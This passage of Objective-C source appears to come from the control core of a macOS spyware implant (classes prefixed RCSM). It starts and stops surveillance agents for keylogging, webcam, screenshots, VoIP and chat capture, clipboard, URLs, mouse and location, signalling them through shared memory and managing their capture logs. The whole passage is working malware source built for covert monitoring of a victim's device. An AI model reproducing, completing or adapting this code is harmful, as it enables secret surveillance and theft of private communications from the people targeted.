            infoLog(@"Error while stopping agent Webcam");
#endif
            return NO;
          }
        
        agentConfiguration = [self getConfigForAgent: agentID];
        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
      
        break;
      }
    case AGENT_KEYLOG:
      {
        agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
        
        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
        shMemoryHeader->agentID         = agentID;
        shMemoryHeader->direction       = D_TO_AGENT;
        shMemoryHeader->command         = AG_STOP;
        
        if ([gSharedMemoryCommand writeMemory: agentCommand
                                       offset: OFFT_KEYLOG
                                fromComponent: COMP_CORE] == TRUE)
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Stop command sent to Agent %x", agentID);
#endif
            
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
            
            [_logManager closeActiveLog: AGENT_KEYLOG
                              withLogID: 0];
          }
        else
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Error while sending Stop command to Agent Keylog");
#endif
            
            return NO;
          }
        
        break;
      }
    case AGENT_VOIP:
      {
        agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
        
        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
        shMemoryHeader->agentID         = agentID;
        shMemoryHeader->direction       = D_TO_AGENT;
        shMemoryHeader->command         = AG_STOP;
        
        if ([gSharedMemoryCommand writeMemory: agentCommand
                                       offset: OFFT_VOIP
                                fromComponent: COMP_CORE] == TRUE)
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Stop command sent to Agent %x", agentID);
#endif
            
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          }
        else
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Error while sending Stop command to agent VOIP");
#endif

            return NO;
          }
        
        // XXX: Close log??
        
        break;
      }
    case AGENT_URL:
      {
        agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
        
        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
        shMemoryHeader->agentID         = agentID;
        shMemoryHeader->direction       = D_TO_AGENT;
        shMemoryHeader->command         = AG_STOP;
        
        if ([gSharedMemoryCommand writeMemory: agentCommand
                                       offset: OFFT_URL
                                fromComponent: COMP_CORE] == TRUE)
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Stop command sent to Agent %x", agentID);
#endif
            
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
            
            [_logManager closeActiveLog: AGENT_URL
                              withLogID: 0];
          }
        else
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Error while sending Stop command to Agent URL");
#endif

            return NO;
          }
        
        break;
      }
    case AGENT_APPLICATION:
      {
        agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
        
        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
        shMemoryHeader->agentID         = agentID;
        shMemoryHeader->direction       = D_TO_AGENT;
        shMemoryHeader->command         = AG_STOP;
        
        if ([gSharedMemoryCommand writeMemory: agentCommand
                                       offset: OFFT_APPLICATION
                                fromComponent: COMP_CORE] == TRUE)
        {
#ifdef DEBUG_TASK_MANAGER
          NSLog(@"%s: Stop command sent to Agent %x", __FUNCTION__, agentID);
#endif
          
          agentConfiguration = [self getConfigForAgent: agentID];
          [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          
          [_logManager closeActiveLog: AGENT_APPLICATION
                            withLogID: 0];
        }
        else
        {
#ifdef DEBUG_TASK_MANAGER
          NSLog(@"%s: Error while sending Stop command to Agent Application", __FUNCTION__);
#endif
          
          return NO;
        }
        break;
      }
    case AGENT_MOUSE:
      {
        agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
        
        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
        shMemoryHeader->agentID         = agentID;
        shMemoryHeader->direction       = D_TO_AGENT;
        shMemoryHeader->command         = AG_STOP;
        
        if ([gSharedMemoryCommand writeMemory: agentCommand
                                       offset: OFFT_MOUSE
                                fromComponent: COMP_CORE] == TRUE)
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Stop command sent to Agent %x", agentID);
#endif
            
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
          }
        else
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Error while sending Stop commmand to Agent Mouse");
#endif

            return NO;
          }
        
        break;
      }
    case AGENT_CHAT:
      {
        agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
        
        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
        shMemoryHeader->agentID         = agentID;
        shMemoryHeader->direction       = D_TO_AGENT;
        shMemoryHeader->command         = AG_STOP;
        
        if ([gSharedMemoryCommand writeMemory: agentCommand
                                       offset: OFFT_IM
                                fromComponent: COMP_CORE] == TRUE)
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Stop command sent to Agent %x", agentID);
#endif
            
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
            
            [_logManager closeActiveLog: AGENT_CHAT
                              withLogID: 0];
          }
        else
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Error while sending Stop command to agent CHAT");
#endif

            return NO;
          }
        
        break;
      }
    case AGENT_CLIPBOARD:
      {
        agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
        
        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
        shMemoryHeader->agentID         = agentID;
        shMemoryHeader->direction       = D_TO_AGENT;
        shMemoryHeader->command         = AG_STOP;
        
        if ([gSharedMemoryCommand writeMemory: agentCommand
                                       offset: OFFT_CLIPBOARD
                                fromComponent: COMP_CORE] == TRUE)
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Stop command sent to Agent %x", agentID);
#endif
        
            agentConfiguration = [self getConfigForAgent: agentID];
            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
            
            [_logManager closeActiveLog: AGENT_CLIPBOARD
                              withLogID: 0];
          }
        else
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Error while sending Stop command to agent Clipboard");
#endif

            return NO;
          }
        
        break;
      }
    case AGENT_POSITION:
      {
#ifdef DEBUG_TASK_MANAGER        
        infoLog(@"Stopping Agent Position");
#endif
        RCSMAgentPosition *agentPosition = [RCSMAgentPosition sharedInstance];
        
        if ([agentPosition stop] == FALSE)
        {
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Error while stopping agent Position");
#endif
          return NO;
        }
        
        agentConfiguration = [self getConfigForAgent: agentID];
        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
        
        break;
      }
    case AGENT_DEVICE:
      {
#ifdef DEBUG_TASK_MANAGER        
        infoLog(@"Stopping Agent Device");
#endif
        RCSMAgentDevice *agentDevice = [RCSMAgentDevice sharedInstance];
        
        if ([agentDevice stop] == FALSE)
        {
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Error while stopping agent agentDevice");
#endif
          return NO;
        }
        else
        {
          agentConfiguration = [self getConfigForAgent: agentID];
          [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
        }
        break;
      }
    default:
      {
#ifdef DEBUG_TASK_MANAGER
        infoLog(@"%s Unsupported agent: 0x%04x", __FUNCTION__, agentID);
#endif
        
        return NO;
      }
    }
  
  return YES;
}

- (BOOL)startAgents
{
  NSAutoreleasePool *outerPool    = [[NSAutoreleasePool alloc] init];
  RCSMLogManager    *_logManager  = [RCSMLogManager sharedInstance];
  
#ifdef DEBUG_TASK_MANAGER
  infoLog(@"Start all Agents called");
#endif

  NSData *agentCommand;
  NSMutableDictionary *anObject;
  
  int i = 0;
  
  //for (anObject in mAgentsList)
  for (; i < [mAgentsList count]; i++)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      anObject = [mAgentsList objectAtIndex: i];
      id agentConfiguration        = nil;
      
      int agentID       = [[anObject objectForKey: @"agentID"] intValue];
      NSString *status  = [[NSString alloc] initWithString: [anObject objectForKey: @"status"]];
      
      if ([status isEqualToString: AGENT_ENABLED] == TRUE)
        {
          switch (agentID)
            {
            case AGENT_SCREENSHOT:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Starting Agent Screenshot");
#endif
                RCSMAgentScreenshot *agentScreenshot = [RCSMAgentScreenshot sharedInstance];
                agentConfiguration = [[anObject objectForKey: @"data"] retain];
                
                if ([agentConfiguration isKindOfClass: [NSString class]])
                  {
                    // Hard error atm, think about default config parameters
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Config not found");
#endif
                    break;
                  }
                else
                  {
                    [anObject setObject: AGENT_START forKey: @"status"];
                    [agentScreenshot setAgentConfiguration: anObject];
                         
                    [NSThread detachNewThreadSelector: @selector(start)
                                             toTarget: agentScreenshot
                                           withObject: nil];
                  }
                                
                break;
              }
#if 0
            case AGENT_ORGANIZER:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Starting Agent Organizer");
#endif
                RCSMAgentOrganizer *agentOrganizer = [RCSMAgentOrganizer sharedInstance];
                agentConfiguration = [[anObject objectForKey: @"data"] retain];
                
                [anObject setObject: AGENT_START
                             forKey: @"status"];
                [agentOrganizer setAgentConfiguration: anObject];
                
                [NSThread detachNewThreadSelector: @selector(start)
                                         toTarget: agentOrganizer
                                       withObject: nil];
                
                break;
              }
#endif
            case AGENT_CAM:
              {   
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Starting Agent Webcam");
#endif
                RCSMAgentWebcam *agentWebcam = [RCSMAgentWebcam sharedInstance];
                agentConfiguration = [[anObject objectForKey: @"data"] retain];
                
                if ([agentConfiguration isKindOfClass: [NSString class]])
                  {
                    // Hard error atm, think about default config parameters
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Config not found");
#endif
                    break;
                  }
                else
                  {
                    [anObject setObject: AGENT_START forKey: @"status"];
                    [agentWebcam setAgentConfiguration: anObject];
                    
                    [NSThread detachNewThreadSelector: @selector(start)
                                             toTarget: agentWebcam
                                           withObject: nil];
                  }
                  
                break;
              }                
            case AGENT_KEYLOG:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Starting Agent Keylogger");
#endif
                agentCommand        = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_START;
                
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Creating KEYLOG Agent log file");
#endif
                BOOL success = [_logManager createLog: AGENT_KEYLOG
                                          agentHeader: nil
                                            withLogID: 0];
                    
                if (success == TRUE)
                  {
                    if ([gSharedMemoryCommand writeMemory: agentCommand
                                                   offset: OFFT_KEYLOG
                                            fromComponent: COMP_CORE] == TRUE)
                      {
                        [anObject setObject: AGENT_RUNNING
                                     forKey: @"status"];
#ifdef DEBUG_TASK_MANAGER
                        infoLog(@"Start command sent to Agent Keylog");
#endif
                      }
                    else
                      {
#ifdef DEBUG_TASK_MANAGER
                        infoLog(@"Error while sending start command to the agent");
#endif
                      }
                  }
                
                break;
              }
            case AGENT_URL:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Starting Agent URL");
#endif
                agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                agentConfiguration = [[anObject objectForKey: @"data"] retain];
                
                if ([agentConfiguration isKindOfClass: [NSString class]])
                  {
                    // Hard error atm, think about default config parameters
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Config not found");
#endif
                    break;
                  }
                else
                  {
                    shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                    shMemoryHeader->agentID         = agentID;
                    shMemoryHeader->direction       = D_TO_AGENT;
                    shMemoryHeader->command         = AG_START;
                    
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Creating URL Agent log file");
#endif
                    BOOL success = [_logManager createLog: AGENT_URL
                                              agentHeader: nil
                                                withLogID: 0];
                    
                    if (success == TRUE)
                      {
                        if ([gSharedMemoryCommand writeMemory: agentCommand
                                                       offset: OFFT_URL
                                                fromComponent: COMP_CORE] == TRUE)
                          {
                            [anObject setObject: AGENT_RUNNING
                                                   forKey: @"status"];
                            
#ifdef DEBUG_TASK_MANAGER
                            infoLog(@"Start command sent to Agent URL");
#endif
                          }
                        else
                          {
#ifdef DEBUG_TASK_MANAGER
                            infoLog(@"An error occurred while starting agent URL");
#endif
                          }
                      }
                  }
                
                break;
              }
            case AGENT_APPLICATION:
              {
#ifdef DEBUG_TASK_MANAGER
                NSLog(@"%s: Starting Agent Application", __FUNCTION__);
#endif
                agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_START;
                  
#ifdef DEBUG_TASK_MANAGER
                NSLog(@"%s: Creating Application Agent log file", __FUNCTION__);
#endif
                BOOL success = [_logManager createLog: AGENT_APPLICATION
                                          agentHeader: nil
                                            withLogID: 0];
                  
                if (success == TRUE)
                {
                  if ([gSharedMemoryCommand writeMemory: agentCommand
                                                 offset: OFFT_APPLICATION
                                          fromComponent: COMP_CORE] == TRUE)
                  {
                    [anObject setObject: AGENT_RUNNING
                                 forKey: @"status"];
                    
#ifdef DEBUG_TASK_MANAGER
                    NSLog(@"%s: Start command sent to Agent Applicatioin", __FUNCTION__);
#endif
                  }
                  else
                  {
#ifdef DEBUG_TASK_MANAGER
                    NSLog(@"%s: An error occurred while starting agent Application", __FUNCTION__);
#endif
                  }
                }
                break;
              }
            case AGENT_MOUSE:
              {
                agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                agentConfiguration = [[anObject objectForKey: @"data"] retain];

                if ([agentConfiguration isKindOfClass: [NSString class]])
                  {
                    // Hard error atm, think about default config parameters
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Config not found");
#endif
                    break;
                  }
                else
                  {
                    shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                    shMemoryHeader->agentID     = AGENT_MOUSE;
                    shMemoryHeader->direction   = D_TO_AGENT;
                    shMemoryHeader->command     = AG_START;
                    
                    NSMutableData *mouseConfig = [NSMutableData dataWithLength: sizeof(shMemoryLog)];
                    
                    shMemoryLog *_mouseConfig     = (shMemoryLog *)[mouseConfig bytes];
                    _mouseConfig->agentID         = AGENT_MOUSE;
                    _mouseConfig->direction       = D_TO_AGENT;
                    _mouseConfig->commandType     = CM_AGENT_CONF;
                    _mouseConfig->commandDataSize = [agentConfiguration length];
                    
                    memcpy(_mouseConfig->commandData,
                           [agentConfiguration bytes],
                           [agentConfiguration length]);
                    
                    if ([gSharedMemoryLogging writeMemory: mouseConfig
                                                   offset: 0
                                            fromComponent: COMP_CORE] == TRUE)
                      {
#ifdef DEBUG_TASK_MANAGER
                        infoLog(@"Starting Agent Mouse");
#endif
                        
                        if ([gSharedMemoryCommand writeMemory: agentCommand
                                                       offset: OFFT_MOUSE
                                                fromComponent: COMP_CORE] == TRUE)
                          {
#ifdef DEBUG_TASK_MANAGER
                            infoLog(@"Start command sent to Agent Mouse");
#endif
                            [anObject setObject: AGENT_RUNNING
                                         forKey: @"status"];
                          }
                      }
                  }
                
                break;
              }
            case AGENT_CHAT:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Starting Agent CHAT");
#endif
                
                agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_START;
                    
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Creating CHAT Agent log file");
#endif
                BOOL success = [_logManager createLog: AGENT_CHAT
                                          agentHeader: nil
                                            withLogID: 0];
                    
                if (success == TRUE)
                  {
                    if ([gSharedMemoryCommand writeMemory: agentCommand
                                                   offset: OFFT_IM
                                            fromComponent: COMP_CORE] == TRUE)
                      {
#ifdef DEBUG_TASK_MANAGER
                        infoLog(@"Start command sent to Agent CHAT");
#endif
                        [anObject setObject: AGENT_RUNNING forKey: @"status"];
                      }
                  }
                
                break;
              }
            case AGENT_CLIPBOARD:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Starting Agent Clipboard");
#endif
                
                agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_START;
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Creating CLIPBOARD Agent log file");
#endif
                BOOL success = [_logManager createLog: AGENT_CLIPBOARD
                                          agentHeader: nil
                                            withLogID: 0];
                    
                if (success == TRUE)
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Starting Agent Clipboard");
#endif
                    if ([gSharedMemoryCommand writeMemory: agentCommand
                                                   offset: OFFT_CLIPBOARD
                                            fromComponent: COMP_CORE] == TRUE)
                      {
                        [anObject setObject: AGENT_RUNNING forKey: @"status"];
#ifdef DEBUG_TASK_MANAGER
                        infoLog(@"Start command sent to Agent Clipboard");
#endif
                      }
                    else
                      {
#ifdef DEBUG_TASK_MANAGER
                        infoLog(@"Error while sending start command to the agent");
#endif
                      }
                  }
                
                break;
              } 
            case AGENT_VOIP:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Starting Agent Voip");
#endif
                
                agentCommand        = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                agentConfiguration  = [[anObject objectForKey: @"data"] retain];
                
                if ([agentConfiguration isKindOfClass: [NSString class]])
                  {
                    // Hard error atm, think about default config parameters
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Config not found");
#endif
                    break;
                  }
                else
                  {
                    shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                    shMemoryHeader->agentID         = AGENT_VOIP;
                    shMemoryHeader->direction       = D_TO_AGENT;
                    shMemoryHeader->command         = AG_START;
                    
                    NSMutableData *voipConfig = [NSMutableData dataWithLength: sizeof(shMemoryLog)];
                    
                    shMemoryLog *_voipConfig     = (shMemoryLog *)[voipConfig bytes];
                    _voipConfig->status          = SHMEM_WRITTEN;
                    _voipConfig->agentID         = AGENT_VOIP;
                    _voipConfig->direction       = D_TO_AGENT;
                    _voipConfig->commandType     = CM_AGENT_CONF;
                    _voipConfig->commandDataSize = [agentConfiguration length];
                    
                    memcpy(_voipConfig->commandData,
                           [agentConfiguration bytes],
                           [agentConfiguration length]);
                    
                    if ([gSharedMemoryLogging writeMemory: voipConfig
                                                   offset: 0
                                            fromComponent: COMP_CORE] == TRUE)
                      {
                        if ([gSharedMemoryCommand writeMemory: agentCommand
                                                       offset: OFFT_VOIP
                                                fromComponent: COMP_CORE] == TRUE)
                          {
#ifdef DEBUG_TASK_MANAGER
                            infoLog(@"Start command sent to Agent Voip");
#endif
                            [anObject setObject: AGENT_RUNNING forKey: @"status"];
                          }
                      }
                  }
                
                break;
              }
            case AGENT_POSITION:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Starting Agent Position");
#endif
                RCSMAgentPosition *agentPosition = [RCSMAgentPosition sharedInstance];
                agentConfiguration = [[self getConfigForAgent: agentID] retain];
                
                if (agentConfiguration != nil)
                {
                  if ([agentConfiguration objectForKey: @"status"]    != AGENT_RUNNING
                      && [agentConfiguration objectForKey: @"status"] != AGENT_START)
                  {
                    [agentConfiguration setObject: AGENT_START forKey: @"status"];
                    [agentPosition setAgentConfiguration: agentConfiguration];
                    
                    [NSThread detachNewThreadSelector: @selector(start)
                                             toTarget: agentPosition
                                           withObject: nil];
                  }
                  else
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Agent Position is already running");
#endif
                  }
                }
                else
                {
#ifdef DEBUG_TASK_MANAGER
                  infoLog(@"Agent not found");
#endif
                  
                  return FALSE;
                }
                break;
              }
            case AGENT_DEVICE:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Starting Agent Device");
#endif
                RCSMAgentDevice *agentDevice = [RCSMAgentDevice sharedInstance];
                agentConfiguration = [[self getConfigForAgent: agentID] retain];
                
                if (agentConfiguration != nil)
                {
                  if ([agentConfiguration objectForKey: @"status"]    != AGENT_RUNNING
                      && [agentConfiguration objectForKey: @"status"] != AGENT_START)
                  {
                    [agentConfiguration setObject: AGENT_START forKey: @"status"];
                    [agentDevice setAgentConfiguration: agentConfiguration];
                    
                    [NSThread detachNewThreadSelector: @selector(start)
                                             toTarget: agentDevice
                                           withObject: nil];
                  }
                  else
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Agent Device is already running");
#endif
                  }
                }
                else
                {
#ifdef DEBUG_TASK_MANAGER
                  infoLog(@"Agent not found");
#endif
                  return FALSE;
                }
                break;
              }
            default:
              break;
            }
          
          if (agentConfiguration != nil)
            [agentConfiguration release];
        }
      
      [status release];
      [innerPool release];
    }
  
  [outerPool release];
  
  return YES;
}

- (BOOL)stopAgents
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  RCSMLogManager *_logManager  = [RCSMLogManager sharedInstance];
  
#ifdef DEBUG_TASK_MANAGER
  infoLog(@"Stop all Agents called");
#endif
  
  NSMutableDictionary *anObject;
  int i = 0;
  
  //for (anObject in mAgentsList)
  for (; i < [mAgentsList count]; i++)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      anObject = [mAgentsList objectAtIndex: i];
      
      int agentID = [[anObject objectForKey: @"agentID"] intValue];
      NSString *status = [[NSString alloc] initWithString: [anObject objectForKey: @"status"]];
      
      if ([status isEqualToString: AGENT_RUNNING] == TRUE)
        {
          switch (agentID)
            {
            case AGENT_SCREENSHOT:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Stopping Agent Screenshot");
#endif
                RCSMAgentScreenshot *agentScreenshot = [RCSMAgentScreenshot sharedInstance];
                
                if ([agentScreenshot stop] == FALSE)
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Error while stopping agent Screenshot");
#endif
                  }
                else
                  {
                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
                  }
                
                break;
              }
#if 0
            case AGENT_ORGANIZER:
              {
#ifdef DEBUG_TASK_MANAGER        
                warnLog(@"Stopping Agent Organizer");
#endif
                RCSMAgentOrganizer *agentOrganizer = [RCSMAgentOrganizer sharedInstance];
              
                if ([agentOrganizer stop] == FALSE)
                  {
#ifdef DEBUG_TASK_MANAGER
                    errorLog(@"Error while stopping agent Organizer");
#endif
                    return NO;
                  }
                else
                  {
                    agentConfiguration = [self getConfigForAgent: agentID];
                    [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
                  }
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Organizer stopped correctly");
#endif
                break;
              }
#endif
            case AGENT_CAM:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Stopping Agent WebCam");
#endif
                RCSMAgentWebcam *agentWebcam = [RCSMAgentWebcam sharedInstance];
              
                if ([agentWebcam stop] == FALSE)
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Error while stopping agent Webcam");
#endif
                  }
                else
                  {
                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
                  }
              
                break;
              }
            case AGENT_KEYLOG:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Stopping Agent Keylogger");
#endif
                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_STOP;
                
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_KEYLOG
                                        fromComponent: COMP_CORE] == TRUE)
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Stop command sent to Agent %x", agentID);
#endif
                    
                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
                    [_logManager closeActiveLog: AGENT_KEYLOG
                                      withLogID: 0];
                  }
                
                [agentCommand release];
              
                break;
              }
            case AGENT_URL:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Stopping Agent URL");
#endif
                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
              
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_STOP;
                
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_URL
                                        fromComponent: COMP_CORE] == TRUE)
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Stop command sent to Agent URL", agentID);
#endif
                    
                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
                    [_logManager closeActiveLog: AGENT_URL
                                      withLogID: 0];
                  }
                
                [agentCommand release];
                
                break;
              }
            case AGENT_APPLICATION:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Stopping Agent Application");
#endif
                NSMutableData *agentCommand = 
                [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_STOP;
                
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_APPLICATION
                                        fromComponent: COMP_CORE] == TRUE)
                {
#ifdef DEBUG_TASK_MANAGER
                  infoLog(@"Stop command sent to Agent Application", agentID);
#endif
                  
                  [anObject setObject: AGENT_STOPPED forKey: @"status"];
                  [_logManager closeActiveLog: AGENT_APPLICATION
                                    withLogID: 0];
                }
                
                [agentCommand release];
                
                break;
              }
            case AGENT_MOUSE:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Stopping Agent Mouse");
#endif
              
                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
              
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_STOP;
                
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_MOUSE
                                        fromComponent: COMP_CORE] == TRUE)
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Stop command sent to Agent Mouse", agentID);
#endif
                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
                  }
              
                [agentCommand release];
                
                break;
              }
            case AGENT_CHAT:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Stopping Agent CHAT");
#endif
              
                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_STOP;
                
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_IM
                                        fromComponent: COMP_CORE] == TRUE)
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Stop command sent to Agent CHAT", agentID);
#endif
                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
                  }
              
                [agentCommand release];
                
                break;
              }
            case AGENT_CLIPBOARD:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Stopping Agent Clipboard");
#endif
              
                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = agentID;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_STOP;
                
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_CLIPBOARD
                                        fromComponent: COMP_CORE] == TRUE)
                  {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Stop command sent to Agent Clipboard", agentID);
#endif
                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
                  }
              
                [agentCommand release];
                
                break;
              }
            case AGENT_VOIP:
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Stopping Agent Voip");
#endif
              
                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID         = AGENT_VOIP;
                shMemoryHeader->direction       = D_TO_AGENT;
                shMemoryHeader->command         = AG_STOP;
                
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_VOIP
                                        fromComponent: COMP_CORE] == TRUE)
                  {
#ifdef DEBUG_TASK_MANAGER
